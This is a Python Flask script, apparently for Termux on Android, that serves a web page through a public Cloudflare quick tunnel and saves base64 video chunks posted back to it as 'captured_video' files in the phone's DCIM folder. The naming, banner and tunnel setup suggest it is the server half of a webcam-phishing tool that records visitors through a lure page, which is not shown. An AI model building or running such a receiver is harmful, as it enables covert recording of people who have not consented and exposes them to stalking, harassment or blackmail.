from flask import Flask, request, jsonify
import base64
import os
import subprocess
import threading
import re
import shutil

app = Flask(__name__)

# Path to Android phone's DCIM folder
DCIM_DIR = os.path.expanduser("~/storage/shared/DCIM/SamPortalVideos")

if not os.path.exists(DCIM_DIR):
    os.makedirs(DCIM_DIR, exist_ok=True)

def print_banner():
    banner = """
🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍💻🧑‍🎤
🙅🙅🙅🙅🙅🙅🙅🙅🙅🙅
📷📷📷📷📷📷📷📷📷📹🎥🎥🎥🎥🎥📹📹📹📹📹
    """
    print("\033[1;36m" + banner + "\033[0m")
    print("\033[1;32m[+] VSM Portal & Cloudflare Tunnel Tool\033[0m")
    print("=" * 50)

@app.route('/')
def index():
    return open('index.html', encoding='utf-8').read()

@app.route('/receiver', methods=['POST'])
def receiver():
    data = request.json
    if not data or 'video' not in data:
        return jsonify({"status": "error", "message": "No video data"}), 400

    try:
        video_data = data['video']
        chunk_num = data.get('chunk', 1)
        
        header, encoded = video_data.split(",", 1)
        binary_data = base64.b64decode(encoded)

        file_path = os.path.join(DCIM_DIR, f"captured_video_part_{chunk_num}.webm")
        with open(file_path, "wb") as f:
            f.write(binary_data)
        
        print(f"\033[1;33m[+] Video successfully saved to DCIM: {file_path}\033[0m")
        return jsonify({"status": "success", "saved_to": file_path})
    
    except Exception as e:
        print(f"\033[1;31m[-] Error occurred: {e}\033[0m")
        return jsonify({"status": "error", "message": str(e)}), 500

def start_cloudflare():
    # Check if cloudflared binary is local or in global path
    cf_path = "./cloudflared" if os.path.exists("./cloudflared") else shutil.which("cloudflared")
    
    if not cf_path:
        print("\033[1;31m[-] Warning: 'cloudflared' file not found! Please place it in the ~/Sam folder or install it.\033[0m")
        return

    cmd = [cf_path, "tunnel", "--url", "http://127.0.0.1:8888"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    while True:
        line = process.stderr.readline()
        if not line:
            break
        match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if match:
            url = match.group(0)
            print(f"\n" + "="*50)
            print(f"\033[1;32m🚀 Cloudflare Public Link: {url}\033[0m")
            print("="*50 + "\n")

if __name__ == '__main__':
    print_banner()
    
    # Start Cloudflare tunnel in the background
    cf_thread = threading.Thread(target=start_cloudflare, daemon=True)
    cf_thread.start()

    print("\033[1;34m[*] Starting Flask local server on port 8888...\033[0m")
    app.run(host='0.0.0.0', port=8888)
        
